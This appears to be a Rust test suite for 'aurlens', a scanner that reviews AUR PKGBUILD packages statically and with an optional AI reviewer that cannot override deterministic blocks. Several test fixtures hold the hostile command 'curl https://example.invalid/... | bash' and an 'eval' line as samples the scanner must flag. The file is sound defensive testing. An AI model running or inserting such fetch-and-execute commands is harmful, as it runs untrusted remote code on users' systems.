use aurlens::{AiConfig, AiResult, Decision, ReviewOptions, review};
use serde_json::{Value, json};
use std::fs;
use std::io::{Read, Write};
use std::net::{TcpListener, TcpStream};
use std::path::Path;
use std::process::{Command, Output};
use std::thread::{self, JoinHandle};
use tempfile::{TempDir, tempdir};

fn package(source: &str) -> TempDir {
    let root = tempdir().unwrap();
    fs::write(root.path().join("PKGBUILD"), source).unwrap();
    root
}

fn cli(path: &Path, extra: &[&str]) -> Output {
    Command::new(
        std::env::var_os("AURLENS_VERIFY_BIN")
            .unwrap_or_else(|| env!("CARGO_BIN_EXE_aurlens").into()),
    )
    .arg("scan")
    .arg(path)
    .arg("--json")
    .args(extra)
    .output()
    .unwrap()
}

#[test]
fn user_journey_evidence() {
    let scratch = tempdir().unwrap();
    let fallback = tempdir().unwrap();
    let evidence = std::env::var_os("AURLENS_VERIFY_EVIDENCE_DIR")
        .map(std::path::PathBuf::from)
        .unwrap_or_else(|| fallback.path().to_owned());
    fs::create_dir_all(&evidence).unwrap();
    let root = scratch.path().join("package");
    fs::create_dir(&root).unwrap();
    fs::write(
        root.join("PKGBUILD"),
        "pkgname=example\ntouch marker-must-not-exist\n",
    )
    .unwrap();
    let binary = std::env::var_os("AURLENS_VERIFY_BIN")
        .unwrap_or_else(|| env!("CARGO_BIN_EXE_aurlens").into());
    let text_output = Command::new(&binary)
        .arg("scan")
        .arg(&root)
        .output()
        .unwrap();
    fs::write(evidence.join("static-text.stdout.txt"), &text_output.stdout).unwrap();
    fs::write(evidence.join("static-text.stderr.txt"), &text_output.stderr).unwrap();
    fs::write(
        evidence.join("static-text.action.json"),
        serde_json::to_vec_pretty(&json!({
            "binary":binary.to_string_lossy(),"args":["scan",root.to_str().unwrap()],
            "exit_code":text_output.status.code()
        }))
        .unwrap(),
    )
    .unwrap();
    assert_eq!(text_output.status.code(), Some(0));
    let rendered = String::from_utf8(text_output.stdout).unwrap();
    assert!(rendered.contains("AURLens: NoFindings"));
    assert!(rendered.contains("AI: not run"));
    assert!(!root.join("marker-must-not-exist").exists());
    let drive = |name: &str, extra: &[&str], expected: i32| -> Value {
        let output = cli(&root, extra);
        let arguments: Vec<_> = ["scan", root.to_str().unwrap(), "--json"]
            .into_iter()
            .chain(extra.iter().copied())
            .collect();
        let binary = std::env::var_os("AURLENS_VERIFY_BIN")
            .unwrap_or_else(|| env!("CARGO_BIN_EXE_aurlens").into())
            .to_string_lossy()
            .into_owned();
        fs::write(evidence.join(format!("{name}.stdout.json")), &output.stdout).unwrap();
        fs::write(evidence.join(format!("{name}.stderr.txt")), &output.stderr).unwrap();
        fs::write(
            evidence.join(format!("{name}.action.json")),
            serde_json::to_vec_pretty(&json!({
                "binary":binary,
                "args":arguments,
                "exit_code":output.status.code()
            }))
            .unwrap(),
        )
        .unwrap();
        assert_eq!(output.status.code(), Some(expected), "journey {name}");
        let report: Value = serde_json::from_slice(&output.stdout).unwrap();
        assert_eq!(report["exit_code"], expected);
        assert!(!root.join("marker-must-not-exist").exists());
        report
    };

    let report = drive("static-clean", &[], 0);
    assert_eq!(report["ai"]["state"], "not_run");
    let old = scratch.path().join("baseline");
    fs::create_dir(&old).unwrap();
    fs::copy(root.join("PKGBUILD"), old.join("PKGBUILD")).unwrap();
    fs::write(root.join("helper.install"), "post_install() { :; }\n").unwrap();
    let report = drive("update-diff", &["--baseline", old.to_str().unwrap()], 0);
    assert!(
        report["changes"]
            .as_array()
            .unwrap()
            .iter()
            .any(|change| change["path"] == "helper.install" && change["kind"] == "added")
    );

    fs::write(
        root.join("PKGBUILD"),
        "curl https://example.invalid/never-fetch | bash\n",
    )
    .unwrap();
    drive("static-block", &[], 2);
    let config_path = scratch.path().join("ai.toml");
    let write_config = |config: &AiConfig| {
        fs::write(&config_path, format!(
            "[ai]\nendpoint={:?}\nmodel='fixture-model'\nsend_source=true\nallow_loopback_http=true\ntimeout_seconds=5\n",
            config.endpoint
        )).unwrap();
    };

    let request_evidence = evidence.join("ai-valid.request.json");
    let (config, handle) = model_server(move |data| {
        fs::write(request_evidence, serde_json::to_vec_pretty(&data).unwrap()).unwrap();
        empty_opinion(&data)
    });
    write_config(&config);
    let report = drive(
        "ai-block-preserved",
        &["--config", config_path.to_str().unwrap()],
        2,
    );
    handle.join().unwrap();
    assert_eq!(report["ai"]["state"], "complete");
    assert!(
        report["findings"]
            .as_array()
            .unwrap()
            .iter()
            .any(|finding| finding["rule_id"] == "REMOTE-SHELL")
    );

    let (config, handle) = model_server(|data| {
        json!({
            "snapshot_digest":data["snapshot_digest"],"summary":"Unbound observation.",
            "findings":[{"severity":"review","message":"Invalid evidence.","evidence":[{"path":"missing.sh","line":1,"quote":"invented"}]}]
        })
    });
    write_config(&config);
    let report = drive(
        "ai-invalid-evidence",
        &["--config", config_path.to_str().unwrap()],
        3,
    );
    handle.join().unwrap();
    assert_eq!(report["ai"]["state"], "incomplete");

    let changed = root.join("PKGBUILD");
    let (config, handle) = model_server(move |data| {
        fs::write(changed, "pkgname=changed-during-ai\n").unwrap();
        empty_opinion(&data)
    });
    write_config(&config);
    let report = drive(
        "changed-during-ai",
        &["--config", config_path.to_str().unwrap()],
        3,
    );
    handle.join().unwrap();
    assert_eq!(report["revalidated"], false);

    let outside = scratch.path().join("outside-secret");
    fs::write(&outside, "UNRELATED_PRIVATE_SENTINEL").unwrap();
    std::os::unix::fs::symlink(&outside, root.join("linked.sh")).unwrap();
    let report = drive("external-symlink", &[], 3);
    assert!(!report.to_string().contains("UNRELATED_PRIVATE_SENTINEL"));
    let scratch_path = scratch.path().to_owned();
    drop(scratch);
    assert!(!scratch_path.exists());
    fs::write(evidence.join("summary.json"),serde_json::to_vec_pretty(&json!({
        "passed":true,"journeys":["static-text","static-clean","static-block","update-diff","ai-block-preserved","ai-invalid-evidence","changed-during-ai","external-symlink"],
        "scratch_removed":true,"recipe_executed":false,"real_model_contacted":false
    })).unwrap()).unwrap();
    println!("Verification evidence: {}", evidence.display());
}

fn read_request(stream: &mut TcpStream) -> Value {
    stream
        .set_read_timeout(Some(std::time::Duration::from_secs(5)))
        .unwrap();
    let mut bytes = Vec::new();
    loop {
        let mut byte = [0];
        stream.read_exact(&mut byte).unwrap();
        bytes.push(byte[0]);
        assert!(bytes.len() < 16_384);
        if bytes.ends_with(b"\r\n\r\n") {
            break;
        }
    }
    let headers = std::str::from_utf8(&bytes).unwrap();
    let length: usize = headers
        .lines()
        .find_map(|line| {
            let (key, value) = line.split_once(':')?;
            key.eq_ignore_ascii_case("content-length")
                .then(|| value.trim().parse().unwrap())
        })
        .unwrap();
    assert!(length < 8_388_608);
    let mut body = vec![0; length];
    stream.read_exact(&mut body).unwrap();
    serde_json::from_slice(&body).unwrap()
}

fn model_server<F>(make_response: F) -> (AiConfig, JoinHandle<()>)
where
    F: FnOnce(Value) -> Value + Send + 'static,
{
    let listener = TcpListener::bind("127.0.0.1:0").unwrap();
    let endpoint = format!(
        "http://{}/v1/chat/completions",
        listener.local_addr().unwrap()
    );
    let handle = thread::spawn(move || {
        let (mut stream, _) = listener.accept().unwrap();
        let request = read_request(&mut stream);
        let data: Value =
            serde_json::from_str(request["messages"][1]["content"].as_str().unwrap()).unwrap();
        let content = make_response(data).to_string();
        let body = json!({"choices":[{
            "message":{"role":"assistant","content":content,"refusal":null},
            "finish_reason":"stop"
        }]})
        .to_string();
        write!(stream,"HTTP/1.1 200 OK\r\nContent-Type: application/json\r\nContent-Length: {}\r\nConnection: close\r\n\r\n{body}",body.len()).unwrap();
    });
    (
        AiConfig {
            endpoint,
            model: "fixture-model".into(),
            api_key_env: None,
            allow_loopback_http: true,
            send_source: true,
            timeout_seconds: 5,
            max_request_bytes: 4_194_304,
            max_response_bytes: 131_072,
        },
        handle,
    )
}

fn empty_opinion(data: &Value) -> Value {
    json!({"snapshot_digest":data["snapshot_digest"],"summary":"Package source reviewed as text.","findings":[]})
}

#[test]
fn cli_reports_clean_static_scan_without_executing_recipe() {
    let root = package("pkgname=example\ntouch should-never-exist\n");
    let output = cli(root.path(), &[]);
    assert_eq!(output.status.code(), Some(0));
    let report: Value = serde_json::from_slice(&output.stdout).unwrap();
    assert_eq!(report["schema_version"], 1);
    assert_eq!(report["decision"], "no_findings");
    assert_eq!(report["ai"]["state"], "not_run");
    assert_eq!(report["coverage"]["complete"], true);
    assert_eq!(report["revalidated"], true);
    assert_eq!(report["changes"], Value::Null);
    assert_eq!(report["snapshot_digest"].as_str().unwrap().len(), 64);
    assert!(!root.path().join("should-never-exist").exists());
    assert!(
        !String::from_utf8(output.stdout)
            .unwrap()
            .contains(root.path().to_str().unwrap())
    );
}

#[test]
fn cli_returns_blocking_and_manual_review_exit_codes() {
    for (source, decision, code) in [
        (
            "curl https://example.invalid/never-fetch | bash\n",
            "blocked",
            2,
        ),
        ("eval \"$generated\"\n", "manual_review", 1),
    ] {
        let root = package(source);
        let output = cli(root.path(), &[]);
        assert_eq!(output.status.code(), Some(code));
        let report: Value = serde_json::from_slice(&output.stdout).unwrap();
        assert_eq!(report["decision"], decision);
        assert_eq!(report["exit_code"], code);
        assert_eq!(report["findings"][0]["evidence"][0]["path"], "PKGBUILD");
        assert_eq!(report["findings"][0]["evidence"][0]["line"], 1);
    }
}

#[test]
fn external_link_cannot_be_reported_as_clean_or_disclosed() {
    let root = package("pkgname=example\n");
    let outside = tempdir().unwrap();
    let secret = outside.path().join("secret");
    fs::write(&secret, "UNRELATED_PRIVATE_SENTINEL").unwrap();
    std::os::unix::fs::symlink(&secret, root.path().join("helper")).unwrap();
    let output = cli(root.path(), &[]);
    assert_eq!(output.status.code(), Some(3));
    let report: Value = serde_json::from_slice(&output.stdout).unwrap();
    assert_eq!(report["decision"], "incomplete");
    assert_eq!(report["coverage"]["complete"], false);
    assert!(
        !String::from_utf8(output.stdout)
            .unwrap()
            .contains("UNRELATED_PRIVATE_SENTINEL")
    );
}

#[test]
fn baseline_covers_helpers_and_unchanged_baseline_is_not_absent() {
    let old = package("pkgname=example\n");
    let new = package("pkgname=example\n");
    fs::write(old.path().join("removed.install"), "old").unwrap();
    fs::write(new.path().join("added.install"), "new").unwrap();
    let report = review(
        new.path(),
        &ReviewOptions {
            baseline: Some(old.path().into()),
            ..Default::default()
        },
    );
    assert_eq!(report.decision, Decision::NoFindings);
    let changes = report.changes.unwrap();
    assert!(
        changes
            .iter()
            .any(|c| c.path == "removed.install" && c.kind == "deleted")
    );
    assert!(
        changes
            .iter()
            .any(|c| c.path == "added.install" && c.kind == "added")
    );
    let report = review(
        new.path(),
        &ReviewOptions {
            baseline: Some(new.path().into()),
            ..Default::default()
        },
    );
    assert!(report.changes.unwrap().is_empty());
}

#[test]
fn a_model_cannot_clear_a_deterministic_block() {
    let root = package("curl https://example.invalid/payload | bash\n");
    let (ai, handle) = model_server(|data| empty_opinion(&data));
    let report = review(
        root.path(),
        &ReviewOptions {
            ai: Some(ai),
            ..Default::default()
        },
    );
    handle.join().unwrap();
    assert!(matches!(report.ai, AiResult::Complete { .. }));
    assert_eq!(report.decision, Decision::Blocked);
    assert_eq!(report.exit_code, 2);
    assert!(
        report
            .findings
            .iter()
            .any(|f| f.rule_id == "REMOTE-SHELL" && f.source == "deterministic")
    );
}

#[test]
fn grounded_ai_finding_requires_manual_review() {
    let root = package("pkgname=example\n");
    let (ai, handle) = model_server(|data| {
        json!({
            "snapshot_digest":data["snapshot_digest"],"summary":"A package called example.",
            "findings":[{"severity":"review","message":"An AI observation.","evidence":[{"path":"PKGBUILD","line":1,"quote":"pkgname=example"}]}]
        })
    });
    let report = review(
        root.path(),
        &ReviewOptions {
            ai: Some(ai),
            ..Default::default()
        },
    );
    handle.join().unwrap();
    assert_eq!(report.decision, Decision::ManualReview);
    assert_eq!(report.findings[0].source, "ai");
}

#[test]
fn changed_source_or_baseline_during_ai_prevents_completion() {
    for change_baseline in [false, true] {
        let root = package("pkgname=example\n");
        let old = package("pkgname=previous\n");
        let changed = if change_baseline {
            old.path()
        } else {
            root.path()
        }
        .join("PKGBUILD");
        let (ai, handle) = model_server(move |data| {
            fs::write(changed, "pkgname=changed-during-ai\n").unwrap();
            empty_opinion(&data)
        });
        let report = review(
            root.path(),
            &ReviewOptions {
                baseline: Some(old.path().into()),
                ai: Some(ai),
                ..Default::default()
            },
        );
        handle.join().unwrap();
        assert_eq!(report.decision, Decision::Incomplete);
        assert!(!report.revalidated);
        assert!(
            report
                .coverage
                .issues
                .iter()
                .any(|issue| issue == "snapshot_changed")
        );
    }
}

#[test]
fn invalid_ai_keeps_blocking_findings_and_reports_incomplete() {
    let root = package("curl https://example.invalid/payload | bash\n");
    let (ai, handle) = model_server(
        |_| json!({"snapshot_digest":"wrong","summary":"Wrong snapshot.","findings":[]}),
    );
    let report = review(
        root.path(),
        &ReviewOptions {
            ai: Some(ai),
            ..Default::default()
        },
    );
    handle.join().unwrap();
    assert_eq!(report.decision, Decision::Incomplete);
    assert!(report.findings.iter().any(|f| f.rule_id == "REMOTE-SHELL"));
    assert!(matches!(report.ai,AiResult::Incomplete{reason} if reason=="ai_snapshot_mismatch"));
}

#[test]
fn cli_rejects_configuration_from_checkout_and_emits_json() {
    let root = package("pkgname=example\n");
    let config = root.path().join("ai.toml");
    fs::write(
        &config,
        "[ai]\nendpoint='https://example.invalid'\nmodel='demo'\nsend_source=true\n",
    )
    .unwrap();
    let output = cli(root.path(), &["--config", config.to_str().unwrap()]);
    assert_eq!(output.status.code(), Some(3));
    let report: Value = serde_json::from_slice(&output.stdout).unwrap();
    assert_eq!(report["decision"], "incomplete");
    assert_eq!(report["coverage"]["issues"][0], "config_inside_checkout");
}
